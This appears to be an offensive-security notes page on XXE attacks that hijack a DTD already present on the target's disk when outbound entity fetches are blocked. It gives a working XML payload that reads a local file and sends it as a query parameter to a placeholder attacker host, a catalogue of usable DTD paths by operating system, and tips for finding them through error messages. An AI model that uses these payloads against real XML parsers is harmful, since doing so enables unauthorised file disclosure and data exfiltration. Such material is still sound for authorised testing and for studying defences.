# Local DTD Hijack — repurpose an on-disk DTD when egress is blocked

## The idea — no outbound needed

When the parser forbids external ENTITY fetches but still resolves
external DTDs *from the local filesystem*, a DTD already on the box can
be repurposed: it declares parameter entities; we *redefine* one of
them (entities take the FIRST definition) to inject our exfil DTD
fragment.

The trick needs a system file that (a) is a DTD or XML with a parameter
entity we can override, and (b) our override runs BEFORE the file's own
declaration — entity first-wins semantics do the override.

## The classic Linux targets — yelp / OpenOffice / custom

```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '&#37;eval;'>
  %local_dtd;
]>
```

`docbookx.dtd` declares `<!ENTITY % ISOamsa "...">` — since our
`<!ENTITY % ISOamsa ...>` comes FIRST, ours wins → inside
`docbookx.dtd`'s expansion, `%ISOamsa;` expands to `%eval;` — we just
injected a parameter-entity reference into a *local* DTD = nested
param-entity expansion allowed (it's inside an external subset now).

## The full working shape (yelp docbookx)

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://YOU/?d=%file;'>">
  <!ENTITY % ISOamsa '&#37;eval;'>
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<r>&send;</r>
```

`%local_dtd;` loads the local DTD → it does `%ISOamsa;` → which is OUR
`%eval;` → which declares `%send;` → `%send;` exfils.

## The catalog of usable local DTDs — by OS

```
Linux (common):
  /usr/share/yelp/dtd/docbookx.dtd         — ISOamsa/ISOamsb/... param ents
  /usr/share/xml/schema/docbook/*/docbookx.dtd
  /usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
  /usr/share/xml/docbook/schema/dtd/*/docbookx.dtd
  /usr/share/xml/xhtml/*/xhtml*.dtd
  /usr/local/lib/python*/site-packages/**/*.dtd
Java:
  /usr/share/java/*/dtds/*.dtd
  C:\Program Files\Java\*\lib\*.dtd
.NET:
  C:\Windows\Microsoft.NET\Framework*\v*\Config\*.dtd?  — rare
OpenOffice:
  /usr/lib/libreoffice/share/dtd/*.dtd?  — officedtd
  /opt/libreoffice*/share/dtd/
Custom app DTDs — anything .dtd on disk
```

The generic oracle: `file:///<known-dtd>` in `%local_dtd` — if the DTD
contains a parameter entity you can shadow, the trick fires.

## The discovery method — find a DTD on the box

- `file:///usr/share/yelp/dtd/` — Java parsers list dirs — look for `.dtd`
- guess common paths above; a FileNotFound vs parse-error tells you if
  the path exists
- once found, read it via `file:///` to find its param entities —
  pick one it USES (referenced with `%name;`) — shadow that name

## Why first-definition-wins

XML spec: when an entity is declared twice, the FIRST declaration binds
— later duplicates are ignored. By declaring `%ISOamsa` (or whatever)
before `%local_dtd;`, our value takes precedence inside the local DTD's
own expansion.

## The "define `%eval;` inside the local DTD" recap

- `%local_dtd;` pulls the local DTD as an external subset → its body
  becomes part of the DTD expansion context
- Inside an external subset, param-entity references CAN occur inside
  markup declarations — the strict-parser limitation of the internal
  subset doesn't apply
- So `%eval;` (pointing to our inline declaration) executes inside the
  local DTD's expansion — the file-read → exfil composition fires

## Windows equivalents — .NET config DTDs

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\CONFIG\*.config — XML not DTD
C:\Windows\Microsoft.NET\Framework64\v*\CONFIG\
```

.NET rarely has a usable local DTD — Windows targets usually need OOB
or error-channel instead.

## When no usable local DTD exists

- error-based exfil — `error-based.md`
- second-order in-band (entity lands in a later page)
- XInclude — `xinclude.md` — no DOCTYPE needed at all

## Falsifiers

- no local DTD found AND no OOB AND no error channel → record
  "entities resolve but no exfil path" as the result
